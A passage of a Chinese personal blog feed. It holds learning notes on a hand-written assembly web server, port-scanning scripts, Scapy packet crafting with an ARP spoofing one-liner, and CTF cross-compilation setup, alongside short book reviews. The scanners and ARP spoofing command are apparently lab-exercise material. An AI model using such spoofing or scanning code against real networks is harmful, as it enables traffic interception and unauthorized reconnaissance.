    mov byte ptr [rsp + 1], 0x2f
    mov byte ptr [rsp + 2], 0x65
    mov byte ptr [rsp + 3], 0x78
    mov byte ptr [rsp + 4], 0x70
    mov byte ptr [rsp + 5], 0x2e
    mov byte ptr [rsp + 6], 0x74
    mov byte ptr [rsp + 7], 0x78
    mov byte ptr [rsp + 8], 0x74
    mov byte ptr [rsp + 9], 0x00
    push rcx
    mov byte ptr [rcx + 16], 0x00
    pop rdi
    mov rsi, 0
    mov rax, 2
    syscall

    // read
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 202
    mov rax, 0
    syscall
    mov r8, rax

    // close
    mov rsi, 5
    mov rax, 3
    syscall

    // write
    mov rdi, 4
    sub rsp, 24
    mov dword ptr [rsp],     0x50545448
    mov dword ptr [rsp + 4], 0x302e312f
    mov dword ptr [rsp + 8], 0x30303220
    mov dword ptr [rsp + 12], 0x0d4b4f20
    mov qword ptr [rsp + 16], 0x000a0d0a
    push rsp
    pop rsi
    mov rdx, 19
    mov rax, 1
    syscall
    add rsp, 24

    // write
    mov rdi, 4
    mov rsi, rsp
    mov rdx, r8
    mov rax, 1
    syscall

    // close
    mov rdi, 4
    mov rax, 3
    syscall
    // accept
    mov rdi, 3
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 43
    syscall
</code></pre>
<pre><code class="asm">.intel_syntax noprefix
.globl _start
.section .text
_start:
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    mov rax, 41
    syscall
    sub rsp, 4
    mov word ptr [rsp], 2
    mov word ptr [rsp + 3], 80
    mov dword ptr [rsp + 4], 0x00000000
    push rsp
    pop rsi
    mov rdi, rax
    mov rdx, 16
    mov rax, 49
    syscall
    mov rdi, 3
    mov rsi, 0
    mov rax, 50
    syscall

    // accept
    mov rdi, 3
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 43
    syscall
    mov r8, rax

    //fork
    mov rax, 57
    syscall

    // close
    mov rdi, r8
    mov rax, 3
    syscall

    // accept
    mov rdi, 3
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 43
    syscall
</code></pre>
<p>循环开线程接包发包 get</p>
<pre><code>========= Parent Process ==========
[ ] execve(&lt;execve_args&gt;) = 0
[ ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
[ ] bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0
    - Bind to port 80
    - Bind to address 0.0.0.0
[ ] listen(3, 0) = 0
[ ] accept(3, NULL, NULL) = 4
[ ] fork() = &lt;fork_result&gt;
[ ] close(4) = 0
[ ] accept(3, NULL, NULL) = ?


========= Child Process ==========
[ ] close(3) = 0
[ ] read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;
[ ] open(&quot;&lt;open_path&gt;&quot;, O_RDONLY) = 3
[ ] read(3, &lt;read_file&gt;, &lt;read_file_count&gt;) = &lt;read_file_result&gt;
[ ] close(3) = 0
[ ] write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19
[ ] write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;
[ ] exit(0) = ?
</code></pre>
<pre><code class="asm">.intel_syntax noprefix
.globl _start
.section .text
_start:
parent:
    // socket
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    mov rax, 41
    syscall
    // bind
    sub rsp, 4
    mov word ptr [rsp], 2
    mov word ptr [rsp + 3], 80
    mov dword ptr [rsp + 4], 0x00000000
    push rsp
    pop rsi
    mov rdi, rax
    mov rdx, 16
    mov rax, 49
    syscall
    // listen
    mov rdi, 3
    mov rsi, 0
    mov rax, 50
    syscall

    // accept
    mov rdi, 3
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 43
    syscall
    mov r8, rax

    //fork
    mov rax, 57
    syscall

    cmp rax, 0
    jz child

    // close
    mov rdi, 4
    mov rax, 3
    syscall
    jmp parent

    // accept
    mov rdi, 3
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 43
    syscall

child:

    // close
    mov rdi, 3
    mov rax, 3
    syscall



    // read
    mov rdi, 4
    push rsp
    pop rsi
    mov rdx, 10000
    xor rax, rax
    syscall
    mov rcx, rsp
    add rcx, 4


    // open
    sub rsp, 9
    mov byte ptr [rsp], 0x2e
    mov byte ptr [rsp + 1], 0x2f
    mov byte ptr [rsp + 2], 0x65
    mov byte ptr [rsp + 3], 0x78
    mov byte ptr [rsp + 4], 0x70
    mov byte ptr [rsp + 5], 0x2e
    mov byte ptr [rsp + 6], 0x74
    mov byte ptr [rsp + 7], 0x78
    mov byte ptr [rsp + 8], 0x74
    mov byte ptr [rsp + 9], 0x00
    push rcx
    mov byte ptr [rcx + 16], 0x00
    pop rdi
    mov rsi, 0
    mov rax, 2
    syscall

    // read
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 202
    mov rax, 0
    syscall
    mov r8, rax

    // close
    mov rsi, 5
    mov rax, 3
    syscall

    // write
    mov rdi, 4
    sub rsp, 24
    mov dword ptr [rsp],     0x50545448
    mov dword ptr [rsp + 4], 0x302e312f
    mov dword ptr [rsp + 8], 0x30303220
    mov dword ptr [rsp + 12], 0x0d4b4f20
    mov qword ptr [rsp + 16], 0x000a0d0a
    push rsp
    pop rsi
    mov rdx, 19
    mov rax, 1
    syscall
    add rsp, 24

    // write
    mov rdi, 4
    mov rsi, rsp
    mov rdx, r8
    mov rax, 1
    syscall

    // accept
    mov rdi, 3
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 43
    syscall

    mov rdi, 0
    mov rax, 60
    syscall
</code></pre>
<p>post 接收参数并写入文件</p>
<p><img src="/2024/04/14/web%E5%85%A5%E9%97%A8%E6%93%8D%E4%BD%9C/image-20240415202715805.png" alt="image-20240415202715805"></p>
<pre><code class="asm">.intel_syntax noprefix
.globl _start
.section .text
_start:
parent:
    // socket
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    mov rax, 41
    syscall
    // bind
    sub rsp, 4
    mov word ptr [rsp], 2
    mov word ptr [rsp + 3], 80
    mov dword ptr [rsp + 4], 0x00000000
    push rsp
    pop rsi
    mov rdi, rax
    mov rdx, 16
    mov rax, 49
    syscall
    // listen
    mov rdi, 3
    mov rsi, 0
    mov rax, 50
    syscall

    // accept
    mov rdi, 3
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 43
    syscall
    mov r8, rax

    //fork
    mov rax, 57
    syscall

    cmp rax, 0
    jz child

    // close
    mov rdi, 4
    mov rax, 3
    syscall
    
    // accept
    mov rdi, 3
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 43
    syscall

    jmp parent

child:
    // close
    mov rdi, 3
    mov rax, 3
    syscall

    // read
    mov rdi, 4
    push rsp
    pop rsi
    mov rdx, 10000
    xor rax, rax
    syscall
    mov r9, rsp
    add r9, 5
    mov r8, rax

    // open
    sub rsp, 9
    push r9
    mov byte ptr [r9 + 16], 0x00
    pop rdi
    mov rsi, 65
    // 这里是八进制......
    mov rdx, 511
    mov rax, 2
    syscall

    // write
    mov rdi, rax
    add r9, 178
    mov rsi, r9    
    mov rdx, r8
    sub rdx, 183
    mov rax, 1
    syscall

    // close
    mov rsi, 3
    mov rax, 3
    syscall

    // write
    mov rdi, 4
    sub rsp, 24
    mov dword ptr [rsp],     0x50545448
    mov dword ptr [rsp + 4], 0x302e312f
    mov dword ptr [rsp + 8], 0x30303220
    mov dword ptr [rsp + 12], 0x0d4b4f20
    mov qword ptr [rsp + 16], 0x000a0d0a
    push rsp
    pop rsi
    mov rdx, 19
    mov rax, 1
    syscall
    add rsp, 24


    // exit
    mov rdi, 0
    mov rax, 60
    syscall
</code></pre>
<p>最终版orz，整合了前面几个操作支持get、post</p>
<pre><code class="asm">.intel_syntax noprefix
.globl _start
.section .text
_start:
    // socket
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    mov rax, 41
    syscall
    mov rbx, rax

    // bind
    sub rsp, 4
    mov word ptr [rsp], 2
    mov word ptr [rsp + 3], 80
    mov dword ptr [rsp + 4], 0x00000000
    push rsp
    pop rsi
    mov rdi, rax
    mov rdx, 16
    mov rax, 49
    syscall

    // listen
    mov rdi, rbx
    mov rsi, 0
    mov rax, 50
    syscall
parent:
    // accept
    mov rdi, rbx
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 43
    syscall
    mov r13, rax

    //fork
    mov rax, 57
    syscall

    cmp rax, 0
    jz child

    // close
    mov rdi, r13
    mov rax, 3
    syscall
    
    // accept
//    mov rdi, rbx
//    xor rsi, rsi
//    xor rdx, rdx
//    mov rax, 43
//    syscall

    jmp parent

child:
    // close
    mov rdi, rbx
    mov rax, 3
    syscall

    // read
    mov rdi, r13
    push rsp
    pop rsi
    mov rdx, 10000
    xor rax, rax
    syscall
    mov r15, rax
    mov r14, rsp

    // &#39;P&#39;
    cmp byte ptr [r14], 80
    jz post

get:
    // open
    sub rsp, 9
    add r14, 4
    push r14
    mov byte ptr [r14 + 16], 0x00
    pop rdi
    mov rsi, 0
    mov rdx, 0
    mov rax, 2
    syscall

    // read
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 10000
    mov rax, 0
    syscall
    mov r12, rax

    // close
    mov rax, 3
    syscall

    // write
    mov rdi, r13
    sub rsp, 24
    mov dword ptr [rsp],     0x50545448
    mov dword ptr [rsp + 4], 0x302e312f
    mov dword ptr [rsp + 8], 0x30303220
    mov dword ptr [rsp + 12], 0x0d4b4f20
    mov qword ptr [rsp + 16], 0x000a0d0a
    push rsp
    pop rsi
    mov rdx, 19
    mov rax, 1
    syscall
    add rsp, 24

    // write
    mov rdi, r13
    mov rsi, rsp
    mov rdx, r12
    mov rax, 1
    syscall

    mov rdi, 0
    mov rax, 60
    syscall


post:
    add r14, 5

    // open
    sub rsp, 9
    push r14
    mov byte ptr [r14 + 16], 0x00
    pop rdi
    mov rsi, 65
    // 这里是八进制......
    mov rdx, 511
    mov rax, 2
    syscall

    // write
    mov rdi, rax
    
    mov rdx, r15
    sub rdx, 183
    cmp rdx, 99
    jg addOne

    add rdx, 1
    sub r14, 1
    
addOne:
    add r14, 178
    mov rsi, r14
    mov rax, 1
    syscall

    // close
    mov rsi, rbx
    mov rax, 3
    syscall

    // write
    mov rdi, r13
    sub rsp, 24
    mov dword ptr [rsp],     0x50545448
    mov dword ptr [rsp + 4], 0x302e312f
    mov dword ptr [rsp + 8], 0x30303220
    mov dword ptr [rsp + 12], 0x0d4b4f20
    mov qword ptr [rsp + 16], 0x000a0d0a
    push rsp
    pop rsi
    mov rdx, 19
    mov rax, 1
    syscall
    add rsp, 24


    // exit
    mov rdi, 0
    mov rax, 60
    syscall
</code></pre>
<h3 id="nc-1"><a href="#nc-1" class="headerlink" title="nc"></a>nc</h3><p>连接</p>
<blockquote>
<p>nc 127.0.0.1 80</p>
</blockquote>
<p>接听</p>
<blockquote>
<p>nc -lp 80</p>
</blockquote>
<p>多线程扫描</p>
<pre><code class="python">import socket
import threading
def check_port(hostname, port):
    try:
        print(f&#39;testing:&#123;hostname&#125;&#39;)
        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.settimeout(2)
        result=sock.connect_ex((hostname,port))
        if (result == 0):
            print(f&#39;&#123;hostname&#125;----------&#39;)
        sock.close()
    except:
        pass

for i in range(256):
    try:
        t = threading.Thread(target=check_port,args=(f&#39;10.0.0.&#123;i&#125;&#39;,31337))
        t.start()
    except:
        print(&quot;Error: unable to start thread&quot;)

while 1:
    pass
</code></pre>
<p>更好的多线程扫描</p>
<pre><code class="python">import socket
import logging
from concurrent.futures import ProcessPoolExecutor, as_completed

# 配置日志
logging.basicConfig(filename=&#39;port_check.log&#39;, level=logging.INFO, format=&#39;%(asctime)s - %(message)s&#39;)

def check_port(hostname, port):
    # print(hostname)
    # print(port)

    try:
        # logging.info(f&#39;testing: &#123;hostname&#125;&#39;)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((hostname, port))
        if result == 0:
            logging.info(f&#39;&#123;hostname&#125;----------&#39;)
            return True
        sock.close()
    except:
        pass
    return False

def parallel_process(array, function):
    &quot;&quot;&quot;
    A parallel version of the map function with a progress bar. 

    Args:
        array (array-like): An array to iterate over.
        function (function): A python function to apply to the elements of array
    Returns:
        [function(array[0]), function(array[1]), ...]
    &quot;&quot;&quot;
    n_jobs = 512  # 线程数
    with ProcessPoolExecutor(max_workers=n_jobs) as pool:
        futures = [pool.submit(function, *a) for a in array]  # 使用 *a 解包参数元组
        kwargs = &#123;
            &#39;total&#39;: len(futures),
            &#39;unit&#39;: &#39;it&#39;,
            &#39;unit_scale&#39;: True,
            &#39;leave&#39;: True
        &#125;
        # Print out the progress as tasks complete


if __name__ == &#39;__main__&#39;:
    array = [(f&#39;10.0.&#123;j&#125;.&#123;i&#125;&#39;, 31337) for i in range(256) for j in range(256)]  # 构造参数数组
    # array = [(f&#39;192.168.0.&#123;i&#125;&#39;, 31337) for i in range(256)]
    # print(array)
    res = parallel_process(array, check_port)
</code></pre>
<h3 id="tcpdump劫持"><a href="#tcpdump劫持" class="headerlink" title="tcpdump劫持"></a>tcpdump劫持</h3><blockquote>
<p>tcpdump -i any port 31337 -w capture.pcap</p>
</blockquote>
<h3 id="hijack"><a href="#hijack" class="headerlink" title="hijack"></a>hijack</h3><p>增加ip监听以获取包</p>
<p><a href="https://ubuntu.com/server/docs/configuring-networks">Configuring networks | Ubuntu</a></p>
<blockquote>
<p>ip addr add 10.0.0.2 dev eth0</p>
</blockquote>
<p>scapy用法</p>
<p><a href="https://scapy.readthedocs.io/en/latest/usage.html">Usage — Scapy 2.5.0 documentation</a></p>
<p>一些可用的指令：</p>
<blockquote>
<p>ip route show</p>
<p>ip route add default via 10.0.0.1</p>
</blockquote>
<p>广播Ethernet包（srp1注意增加filter，这样不会收到自己发的包，或者用srp批量都接收）</p>
<pre><code class="python">from scapy.all import *

# Get your MAC address (assuming you&#39;re on a Linux system)

# Create the Ethernet frame with your MAC address as the source
eth_frame = Ether(src=&quot;e6:d2:90:8f:34:8f&quot;, dst=&quot;ff:ff:ff:ff:ff:ff&quot;, type=0xFFFF)

# Send the Ethernet frame and receive packets
reply_packets = srp1(eth_frame, timeout=2, iface=&quot;eth0&quot;, filter=&quot;ether src not e6:d2:90:8f:34:8f&quot;)

# Display received packets
if reply_packets:
    print(reply_packets.show())
else:
    print(&quot;No reply received.&quot;)
</code></pre>
<p>发送ip包（注意，这里是一层一层搭建的，每层的包正常运转下一层的包才能成功发送，！注意！前面的type不能指定，这里是自动对field适应的，指定后会导致后续上层信息丢包）</p>
<pre><code class="python">from scapy.all import *

eth_frame = Ether(src=&quot;3e:72:ce:70:a9:74&quot;, dst=&quot;ff:ff:ff:ff:ff:ff&quot;)

ip_packet = IP(proto=0xFF, dst=&quot;10.0.0.3&quot;,src=&quot;10.0.0.2&quot;)
packet = eth_frame/ip_packet

reply_packets = srp1(packet, timeout=2, iface=&quot;eth0&quot;)

if reply_packets:
    print(reply_packets.show())
else:
    print(&quot;No reply received.&quot;)
</code></pre>
<p>发送tcp包，和上面一样的注意事项就一遍过</p>
<pre><code class="python">from scapy.all import *

eth_frame = Ether(src=&quot;02:42:0a:00:b5:ef&quot;, dst=&quot;ff:ff:ff:ff:ff:ff&quot;)

ip_packet = IP(dst=&quot;10.0.0.3&quot;,src=&quot;10.0.181.239&quot;)

tcp_packet = TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags=&quot;APRSF&quot;)

packet = eth_frame/ip_packet/tcp_packet

reply_packets = srp1(packet, timeout=2, iface=&quot;eth0&quot;)

if reply_packets:
    print(reply_packets.show())
else:
    print(&quot;No reply received.&quot;)
</code></pre>
<p>官网的demo：<code>a=Ether()/IP(dst=&quot;www.slashdot.org&quot;)/TCP()/&quot;GET /index.html HTTP/1.0 \n\n&quot;</code></p>
<p>TCP handshake：</p>
<pre><code class="python">from scapy.all import *

eth_frame = Ether(src=&quot;8a:c9:61:2b:94:3c&quot;, dst=&quot;ff:ff:ff:ff:ff:ff&quot;)

ip_packet = IP(dst=&quot;10.0.0.3&quot;,src=&quot;10.0.0.2&quot;)

tcp_packet = TCP(sport=31337, dport=31337, seq=31337, flags=&quot;S&quot;)

packet = eth_frame/ip_packet/tcp_packet

reply_packets = srp1(packet, timeout=2, iface=&quot;eth0&quot;)

if reply_packets:
    print(reply_packets.show())
else:
    print(&quot;No reply received.&quot;)

eth_frame = Ether(src=&quot;8a:c9:61:2b:94:3c&quot;, dst=&quot;ff:ff:ff:ff:ff:ff&quot;)

ip_packet = IP(dst=&quot;10.0.0.3&quot;,src=&quot;10.0.0.2&quot;)

tcp_packet = TCP(sport=31337, dport=31337, seq=31338, ack = reply_packets.seq + 1, flags=&quot;A&quot;)

packet = eth_frame/ip_packet/tcp_packet

reply_packets = srp1(packet, timeout=3, iface=&quot;eth0&quot;)

if reply_packets:
    print(reply_packets[0].show())
else:
    print(&quot;No reply received.&quot;)
</code></pre>
<p>ARP（注意ARP中的hwsrc需要再设置一次mac，否则接收不到回包）</p>
<pre><code class="python">from scapy.all import *

eth_frame = Ether(src=&quot;3a:a0:e5:64:0f:e3&quot;, dst=&quot;ff:ff:ff:ff:ff:ff&quot;)

arp_packet = ARP(hwsrc=&quot;3a:a0:e5:64:0f:e3&quot;,op=&#39;is-at&#39;,psrc=&quot;10.0.0.2&quot;,pdst=&quot;10.0.0.3&quot;,hwdst=&quot;ff:ff:ff:ff:ff:ff&quot;)

packet = eth_frame/arp_packet

reply_packets = srp1(packet, timeout=3, iface=&quot;eth0&quot;)

if reply_packets:
    print(reply_packets.show())
else:
    print(&quot;No reply received.&quot;)

# print(arp_mitm(&quot;10.0.0.3&quot;,&quot;10.0.0.2&quot;))
</code></pre>
<p>ARP欺骗（直接伪造ip即可）</p>
<pre><code class="python">sendp(Ether(src=get_if_hwaddr(&quot;eth0&quot;), dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / ARP(op=&quot;is-at&quot;, psrc=&quot;10.0.0.2&quot;, hwsrc=get_if_hwaddr(&quot;eth0&quot;)), iface=&quot;eth0&quot;)
</code></pre>
<p>差一个题，稍微复杂，大概知道怎么做但是晚点做吧…</p>
]]></content>
  </entry>
  <entry>
    <title>《杀死一只知更鸟》</title>
    <url>/2023/11/27/%E3%80%8A%E6%9D%80%E6%AD%BB%E4%B8%80%E5%8F%AA%E7%9F%A5%E6%9B%B4%E9%B8%9F%E3%80%8B/</url>
    <content><![CDATA[<h6 id="PREFACE：推荐读物，感觉以后专门开个分区"><a href="#PREFACE：推荐读物，感觉以后专门开个分区" class="headerlink" title="PREFACE：推荐读物，感觉以后专门开个分区"></a>PREFACE：推荐读物，感觉以后专门开个分区</h6><h6 id="TODO：修一下博客的分类功能"><a href="#TODO：修一下博客的分类功能" class="headerlink" title="TODO：修一下博客的分类功能"></a>TODO：修一下博客的分类功能</h6><span id="more"></span>

<p>确实是好书，不枉经典</p>
<p>笔触挺平和的，有点《葬送的芙莉蓮》那味（感觉这么比怪怪的，但是有神似之处）</p>
]]></content>
  </entry>
  <entry>
    <title>《被讨厌的勇气》</title>
    <url>/2023/11/13/%E3%80%8A%E8%A2%AB%E8%AE%A8%E5%8E%8C%E7%9A%84%E5%8B%87%E6%B0%94%E3%80%8B/</url>
    <content><![CDATA[<h6 id="PREFACE：哲学心理学作品，与技术无关，但是私认为每一个对自己的人生价值、意义，对人际交往，对自己的过去与未来心存迷茫或芥蒂的人，或许都能从中感悟或碰撞出一些结论"><a href="#PREFACE：哲学心理学作品，与技术无关，但是私认为每一个对自己的人生价值、意义，对人际交往，对自己的过去与未来心存迷茫或芥蒂的人，或许都能从中感悟或碰撞出一些结论" class="headerlink" title="PREFACE：哲学心理学作品，与技术无关，但是私认为每一个对自己的人生价值、意义，对人际交往，对自己的过去与未来心存迷茫或芥蒂的人，或许都能从中感悟或碰撞出一些结论"></a>PREFACE：哲学心理学作品，与技术无关，但是私认为每一个对自己的人生价值、意义，对人际交往，对自己的过去与未来心存迷茫或芥蒂的人，或许都能从中感悟或碰撞出一些结论</h6><h6 id="简单聊聊，无指向或针对性"><a href="#简单聊聊，无指向或针对性" class="headerlink" title="简单聊聊，无指向或针对性"></a>简单聊聊，无指向或针对性</h6><span id="more"></span>

<p>​		看完了，总计花了5h左右，书不太长，看得比较慢。以哲学的口吻讲述阿德勒心理学，本质上是哲学，核心问题是以看待人际关系的角度（个人以及与他人的联系，以及我们的潜意识和表意识对待这种联系的态度）来解释个人的行为。阿德勒心理学也称为个体心理学，这本书基本上是立足于对个人的思考进行的。</p>
<p>​		书中采用年轻人和哲学家的对话进行（话说《苏菲的世界》好像也是类似的对话教学模式，莫不是哲学家都喜欢这样叙事×）</p>
<p>​		年轻人有的苦恼，以及年轻人举例的苦恼，感觉上是很多人都会有的。感觉猛猛对号入座了一把…</p>
<h6 id="TODO：有空再补补感想，写一半写累了不想写了"><a href="#TODO：有空再补补感想，写一半写累了不想写了" class="headerlink" title="TODO：有空再补补感想，写一半写累了不想写了"></a>TODO：有空再补补感想，写一半写累了不想写了</h6><p>​		总归为自己很长一段时间的探求给出了一个结论，接下来是对待这个结论的态度。</p>
<p>​		话说今天一天光看书了，啥活也没干，啥也没学，明明是最忙的周一：）</p>
]]></content>
  </entry>
  <entry>
    <title>交叉编译以及其他架构逆向初探</title>
    <url>/2023/08/26/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E4%BB%A5%E5%8F%8A%E5%85%B6%E4%BB%96%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface-蓝帽杯初赛2023，题目没做出来，理论上能出，实际上没时间，就算有时间估计也不会去看那么多汇编，但是既然结合0CTF2021也有一个类似折磨的pwn题（虽然那个题很多种意义上说其实好很多，即使我还是偏re手）不过感觉还是有很多东西要学以及刚学到，浅记录一下。"><a href="#preface-蓝帽杯初赛2023，题目没做出来，理论上能出，实际上没时间，就算有时间估计也不会去看那么多汇编，但是既然结合0CTF2021也有一个类似折磨的pwn题（虽然那个题很多种意义上说其实好很多，即使我还是偏re手）不过感觉还是有很多东西要学以及刚学到，浅记录一下。" class="headerlink" title="preface: 蓝帽杯初赛2023，题目没做出来，理论上能出，实际上没时间，就算有时间估计也不会去看那么多汇编，但是既然结合0CTF2021也有一个类似折磨的pwn题（虽然那个题很多种意义上说其实好很多，即使我还是偏re手）不过感觉还是有很多东西要学以及刚学到，浅记录一下。"></a>preface: 蓝帽杯初赛2023，题目没做出来，理论上能出，实际上没时间，就算有时间估计也不会去看那么多汇编，但是既然结合0CTF2021也有一个类似折磨的pwn题（虽然那个题很多种意义上说其实好很多，即使我还是偏re手）不过感觉还是有很多东西要学以及刚学到，浅记录一下。</h6><span id="more"></span>

<h5 id="一点前置知识：IoT安全研究视角的交叉编译-Clang裁缝店-xuanxuanblingbling-github-io"><a href="#一点前置知识：IoT安全研究视角的交叉编译-Clang裁缝店-xuanxuanblingbling-github-io" class="headerlink" title="一点前置知识：IoT安全研究视角的交叉编译 | Clang裁缝店 (xuanxuanblingbling.github.io)"></a>一点前置知识：<a href="https://xuanxuanblingbling.github.io/ctf/tools/2021/02/16/cross/">IoT安全研究视角的交叉编译 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></h5><h5 id="这两片可以结合着看看（后面那篇接近我的主要思路，but-failed-QAQ）0CTF-x2F-TCTF-2021-tile-Clang裁缝店-xuanxuanblingbling-github-io-ctf-x2F-2021-07-03-0CTF-TCTF-2021-Quals-x2F-tile-at-master-·-mephi42-x2F-ctf-github-com"><a href="#这两片可以结合着看看（后面那篇接近我的主要思路，but-failed-QAQ）0CTF-x2F-TCTF-2021-tile-Clang裁缝店-xuanxuanblingbling-github-io-ctf-x2F-2021-07-03-0CTF-TCTF-2021-Quals-x2F-tile-at-master-·-mephi42-x2F-ctf-github-com" class="headerlink" title="这两片可以结合着看看（后面那篇接近我的主要思路，but failed. QAQ）0CTF &#x2F; TCTF 2021 tile | Clang裁缝店 (xuanxuanblingbling.github.io)  |  ctf&#x2F;2021.07.03_0CTF_TCTF_2021_Quals&#x2F;tile at master · mephi42&#x2F;ctf (github.com)"></a>这两片可以结合着看看（后面那篇接近我的主要思路，but failed. QAQ）<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2021/07/05/tile/">0CTF &#x2F; TCTF 2021 tile | Clang裁缝店 (xuanxuanblingbling.github.io)</a>  |  <a href="https://github.com/mephi42/ctf/tree/master/2021.07.03_0CTF_TCTF_2021_Quals/tile">ctf&#x2F;2021.07.03_0CTF_TCTF_2021_Quals&#x2F;tile at master · mephi42&#x2F;ctf (github.com)</a></h5><h5 id="基本流程：搭建qemu环境尝试gdb调试（发现缺so，尤其稀有架构的so挺麻烦的）"><a href="#基本流程：搭建qemu环境尝试gdb调试（发现缺so，尤其稀有架构的so挺麻烦的）" class="headerlink" title="基本流程：搭建qemu环境尝试gdb调试（发现缺so，尤其稀有架构的so挺麻烦的）"></a>基本流程：搭建qemu环境尝试gdb调试（发现缺so，尤其稀有架构的so挺麻烦的）</h5><h5 id="objdump切换架构硬看汇编，结合ida识别的段猜（比obj-D-的信息稍微清楚一点，不过要记得）"><a href="#objdump切换架构硬看汇编，结合ida识别的段猜（比obj-D-的信息稍微清楚一点，不过要记得）" class="headerlink" title="objdump切换架构硬看汇编，结合ida识别的段猜（比obj -D 的信息稍微清楚一点，不过要记得）"></a>objdump切换架构硬看汇编，结合ida识别的段猜（比obj -D 的信息稍微清楚一点，不过要记得）</h5><h5 id="猜测是challenge1是-amp-0x7f，challenge2异或，challenge3借助map做了什么操作，怀疑是换序然后简单对字符处理…"><a href="#猜测是challenge1是-amp-0x7f，challenge2异或，challenge3借助map做了什么操作，怀疑是换序然后简单对字符处理…" class="headerlink" title="猜测是challenge1是&amp;0x7f，challenge2异或，challenge3借助map做了什么操作，怀疑是换序然后简单对字符处理…"></a>猜测是<code>challenge1</code>是<code>&amp;0x7f</code>，<code>challenge2</code>异或，<code>challenge3</code>借助map做了什么操作，怀疑是换序然后简单对字符处理…</h5><h6 id="还学了这么个小知识点：原生的qemu不支持NX，故shellcode一把梭应该就行"><a href="#还学了这么个小知识点：原生的qemu不支持NX，故shellcode一把梭应该就行" class="headerlink" title="还学了这么个小知识点：原生的qemu不支持NX，故shellcode一把梭应该就行"></a>还学了这么个小知识点：<code>原生的qemu不支持NX，故shellcode一把梭应该就行</code></h6><hr>
<h5 id="本体搭建过程："><a href="#本体搭建过程：" class="headerlink" title="本体搭建过程："></a>本体搭建过程：</h5><h4 id="qemu运行过程（虽然题目中是缺so的，但是确实是这么个流程）"><a href="#qemu运行过程（虽然题目中是缺so的，但是确实是这么个流程）" class="headerlink" title="- qemu运行过程（虽然题目中是缺so的，但是确实是这么个流程）"></a>- qemu运行过程（虽然题目中是缺so的，但是确实是这么个流程）</h4><h5 id="sudo-apt-install-git-libglib2-0-dev-libfdt-dev-libpixman-1-dev-zlib1g-dev"><a href="#sudo-apt-install-git-libglib2-0-dev-libfdt-dev-libpixman-1-dev-zlib1g-dev" class="headerlink" title="sudo apt install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev"></a><code>sudo apt install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev</code></h5><h5 id="git-clone-https-git-qemu-org-git-qemu-git"><a href="#git-clone-https-git-qemu-org-git-qemu-git" class="headerlink" title="git clone https://git.qemu.org/git/qemu.git"></a><code>git clone https://git.qemu.org/git/qemu.git</code></h5><h5 id="cd-qemu"><a href="#cd-qemu" class="headerlink" title="cd qemu"></a><code>cd qemu</code></h5><h5 id="git-checkout-v5-0-0"><a href="#git-checkout-v5-0-0" class="headerlink" title="git checkout v5.0.0"></a>git checkout v5.0.0</h5><h5 id="configure-target-list-tilegx-linux-user"><a href="#configure-target-list-tilegx-linux-user" class="headerlink" title="./configure --target-list=tilegx-linux-user"></a><code>./configure --target-list=tilegx-linux-user</code></h5><h5 id="make"><a href="#make" class="headerlink" title="make"></a><code>make</code></h5><h5 id="cd-tilegx-linux-user"><a href="#cd-tilegx-linux-user" class="headerlink" title="cd tilegx-linux-user/"></a><code>cd tilegx-linux-user/</code></h5><h5 id="qemu-tilegx-Desktop-newFolder-chall"><a href="#qemu-tilegx-Desktop-newFolder-chall" class="headerlink" title="./qemu-tilegx ./Desktop/newFolder/chall"></a><code>./qemu-tilegx ./Desktop/newFolder/chall</code></h5><h4 id="objdump配置过程："><a href="#objdump配置过程：" class="headerlink" title="- objdump配置过程："></a>- objdump配置过程：</h4><h5 id="wget-https-ftp-gnu-org-gnu-binutils-binutils-2-35-tar-gz"><a href="#wget-https-ftp-gnu-org-gnu-binutils-binutils-2-35-tar-gz" class="headerlink" title="wget https://ftp.gnu.org/gnu/binutils/binutils-2.35.tar.gz"></a><code>wget https://ftp.gnu.org/gnu/binutils/binutils-2.35.tar.gz</code></h5><h5 id="tar-xvf-binutils-2-35-tar-gz"><a href="#tar-xvf-binutils-2-35-tar-gz" class="headerlink" title="tar xvf binutils-2.35.tar.gz"></a><code>tar xvf binutils-2.35.tar.gz</code></h5><h5 id="cd-binutils-2-35"><a href="#cd-binutils-2-35" class="headerlink" title="cd binutils-2.35"></a><code>cd binutils-2.35</code></h5><h5 id="mkdir-build-amp-amp-cd-build"><a href="#mkdir-build-amp-amp-cd-build" class="headerlink" title="mkdir build &amp;&amp; cd build"></a><code>mkdir build &amp;&amp; cd build</code></h5><h5 id="configure-target-tilegx-linux-gnu"><a href="#configure-target-tilegx-linux-gnu" class="headerlink" title="../configure 